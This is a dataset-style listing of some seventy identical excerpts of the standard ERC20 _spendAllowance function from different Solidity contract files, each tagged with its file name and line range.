<source file="systems/source-code/0xca7d2118fbfaac126a51d403c2f73eff4af97a1a.sol" startline="135" endline="145" pcid="7226">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x75d5d49F80871F23bEE1448070790A77C56d3d00.sol" startline="119" endline="129" pcid="4370">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x084C028E04F9C7aa04b2CeE80edE5DA2Fa3bbaF2.sol" startline="122" endline="132" pcid="219">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x32eC423819A8C80CC7B609C20961371e75E54FA0.sol" startline="125" endline="135" pcid="1588">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x60871C6c7c923B61f77C2df7AB15879239FeD83F.sol" startline="124" endline="134" pcid="3674">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xFc9804E65cC6E47964c809b9f704440DFb8C5eA0.sol" startline="121" endline="131" pcid="9214">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x19a99e5BBFAE5fcF744b3C866b40e36aD15CF656.sol" startline="125" endline="135" pcid="811">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x31106529aB0136C568C856A9A07dDbBAe8512865.sol" startline="122" endline="132" pcid="1555">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x6068BB046aaF234EEa71A9d54Dd77d76D6dF5581.sol" startline="123" endline="133" pcid="3656">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x3c36CB64F2255b3558b0056E3c2F5C025E8B7a6d.sol" startline="127" endline="137" pcid="2087">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x847d2f49E856550F93f7aADF444528a024256372.sol" startline="125" endline="135" pcid="4954">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x3D9efe658017c9f4e19E61c4dE211FB55B0E47d6.sol" startline="118" endline="128" pcid="2240">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xF3E3E0381509e1B6a83f0D8E41b7219777010A51.sol" startline="124" endline="134" pcid="8888">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x5fA90D86c0F1a01F1f4aaB2C1a98e45adC5Ee38f.sol" startline="127" endline="137" pcid="3627">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x2AE6bAa928cFeD647807104d4de73aA779a8f433.sol" startline="123" endline="133" pcid="1286">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xDc41DbF96D3641d64D46C2a9D805B2a7eA804438.sol" startline="121" endline="131" pcid="7826">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xfd1e0ec0d64d806d833b80b8cbd01dfdc9062c3d.sol" startline="125" endline="135" pcid="9236">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x79868a92715cc6ba1829a46d292992d1c1945e6c.sol" startline="127" endline="137" pcid="4598">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x92Fb66bAcacDeB0BFf34538D805521F1019dce1a.sol" startline="120" endline="130" pcid="5340">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x5f4B753ddeb0Bc2f78D4bE446994BF0C0497D98e.sol" startline="125" endline="135" pcid="3604">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x3dA0eD9Ba67D1EC0CF5fDeE7598B544BD8A1fA38.sol" startline="126" endline="136" pcid="2255">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xa5bf4225edeFe7bdA05825b60D5497e2a5445F1e.sol" startline="122" endline="132" pcid="6042">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xd80f2392f3592471ef0a0163441db092268c19ee.sol" startline="135" endline="145" pcid="7735">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x5d914a5ad977439fb1b9a25a6cd71ef41da418dc.sol" startline="124" endline="134" pcid="3586">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x5d78329DB4EddA91c08E819b0E6a952ebBD05018.sol" startline="125" endline="135" pcid="3571">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x5D72b13F2b049d108CBc50b038dcC10904653d35.sol" startline="123" endline="133" pcid="3556">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x3f2c722fd5aedb210beaa0f6932f355c1973c94b.sol" startline="124" endline="134" pcid="2274">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xfDC34A848cBc058f5D246D22b3d9B96eB7d5a301.sol" startline="122" endline="132" pcid="9284">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xE413f21F74faC68bCd2c16626f0FCa30b55692Dd.sol" startline="123" endline="133" pcid="8281">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x5C1f1986b0cD5EF29A7528f59DC0dC03060dE44E.sol" startline="118" endline="128" pcid="3536">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x5bf8D2aedA8ECE0373C4F0C5B28633DF3A5aB834.sol" startline="185" endline="195" pcid="3521">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xfE0A4D6A16F934E3d595DB4b0D893071124CB693.sol" startline="120" endline="130" pcid="9299">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xF6d9Db3461567c11929e641c6beb075213efEc9d.sol" startline="125" endline="135" pcid="9028">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x5ba66281ec78ee1a83e7a449d1692b0fda7023e2.sol" startline="110" endline="120" pcid="3506">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x865Ca5Fb63230fC0e75Ab51EB04895e3A8aD8808.sol" startline="119" endline="129" pcid="5009">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x3FA3c749646aC090A2e6e6A5097D7bA40a59073A.sol" startline="124" endline="134" pcid="2295">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x5b80d34d9b91f7e424d4fb73aba7cf5647ead8fa.sol" startline="125" endline="135" pcid="3493">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xFE485690c31dD2DCbc1919B430d594F3389D6e82.sol" startline="449" endline="459" pcid="9320">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x5B8048664dB0A24b6372Cab5972baE9F40c6012e.sol" startline="122" endline="132" pcid="3478">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x5ad359AaC713929412c9b802175A9f12E5cf9306.sol" startline="122" endline="132" pcid="3463">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x3fb9d6a99375a51fd64641bd6e1fd6dd310b74e4.sol" startline="132" endline="142" pcid="2310">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x5ABbDae4e6d7c89640129E87409C8F991CeE5174.sol" startline="125" endline="135" pcid="3448">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xfEf911f4AbE542804fdDFD538E637c827a2c4295.sol" startline="124" endline="134" pcid="9338">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x5aa699e74fb24d7f1d04e2392df05133da7cadc7.sol" startline="125" endline="135" pcid="3433">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xCDFcbB5be93d37A33C85ffd7828dDDd332823349.sol" startline="121" endline="131" pcid="7318">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xcd8bdb2857ea0948122ccb9b17fc2a6d721b97ae.sol" startline="123" endline="133" pcid="7303">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xf35aD950b9A888FF9E9c25B9a71c19dDF57d61F4.sol" startline="125" endline="135" pcid="8873">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xff5c2d7Ea91Cb2a88e58E840f24088B5b445834A.sol" startline="125" endline="135" pcid="9353">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x59C507Cb69406B5975e70A3c3993AF74c11EF51d.sol" startline="125" endline="135" pcid="3395">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xfFc50B460871D6dF13CA15F24c29cB646B6606f5.sol" startline="125" endline="135" pcid="9368">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x2E28a09452b865B719676E3629Fd002222D1111A.sol" startline="125" endline="135" pcid="1392">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x35539cc6f1f1c0449474fdaaa0939893457163da.sol" startline="123" endline="133" pcid="1791">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x2873e31F73f0dA96832ddcD0EB70006d6b17D228.sol" startline="125" endline="135" pcid="1251">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xdBE642963F5e8dF51Ccc6924B2bEfa8930149721.sol" startline="125" endline="135" pcid="7811">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x1b6B980b58C60aB35EeE3894Fc225E711B20f472.sol" startline="124" endline="134" pcid="866">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x75780415fCA0157e4814A1A2588f1eE9Ff0F7E88.sol" startline="126" endline="136" pcid="4354">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x46a9D15f23306E44060fb3558CDF051dD9D83FA9.sol" startline="123" endline="133" pcid="2650">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xD1E4a04142D5B5174C6E7129C11740F73d721f5A.sol" startline="122" endline="132" pcid="7509">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x46e743046dccf9ab65b8454cdf879187aab5dd49.sol" startline="126" endline="136" pcid="2665">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x4701BD9e462012bC2A6D9e6aD71a132d7b64dF7d.sol" startline="122" endline="132" pcid="2680">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x400ceeaef948d1DfE5fD1F2fa5a431Fb7e11a086.sol" startline="121" endline="131" pcid="2351">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x460dad15a49c2738b3fc8cb5c7dcfa5d530847af.sol" startline="125" endline="135" pcid="2633">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x58f43Dc7968012f4DB78EC97A36c9998658ffCcC.sol" startline="120" endline="130" pcid="3351">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x585E00E541d4e331A7574248beC368420BBaDdf1.sol" startline="121" endline="131" pcid="3331">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x837c26F4D6Be1E7466Fe92fE138b8c4af8C59D0C.sol" startline="125" endline="135" pcid="4939">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xd4738e9EE70F7C409c5704A8243E2Cf75162098f.sol" startline="125" endline="135" pcid="7583">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x3ce7CAfDEB197967161757d8a44e60e9Bf58bC10.sol" startline="123" endline="133" pcid="2176">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xa0EeeaeA46e92b35849f6F3afC9C63478A0967A0.sol" startline="124" endline="134" pcid="5790">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x4751AA52a743FFea38c4031e5158AcfA30347f26.sol" startline="120" endline="130" pcid="2695">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x402b213C2Fbc27fBf8E127AD40Fad371dDac94a5.sol" startline="122" endline="132" pcid="2366">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x98D29fe112bFce3C568b3e7B56CA95F4f684f2E2.sol" startline="125" endline="135" pcid="5552">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x029D614F344A2a6edE1de8ef4793a3369De927d4.sol" startline="121" endline="131" pcid="103">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
